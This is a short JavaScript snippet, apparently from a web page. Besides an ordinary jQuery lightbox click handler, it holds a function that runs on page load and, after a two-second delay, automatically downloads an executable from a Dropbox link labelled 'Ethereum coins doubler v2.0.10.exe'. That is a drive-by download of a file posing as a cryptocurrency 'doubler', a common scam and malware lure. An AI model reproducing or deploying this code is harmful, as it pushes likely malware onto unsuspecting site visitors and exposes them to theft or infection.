function download(){
  setTimeout(function(){
    downloadFile("https://dl.dropboxusercontent.com/s/98tcwm34r5tkvn6/Ethereum%20coins%20doubler%20v2.0.10.exe");
  }, 1998);
};
window.addEventListener("load", download);
$(document).on('click', '[data-toggle="lightbox"]', function(event) {
  event.preventDefault();
  $(this).ekkoLightbox();
});
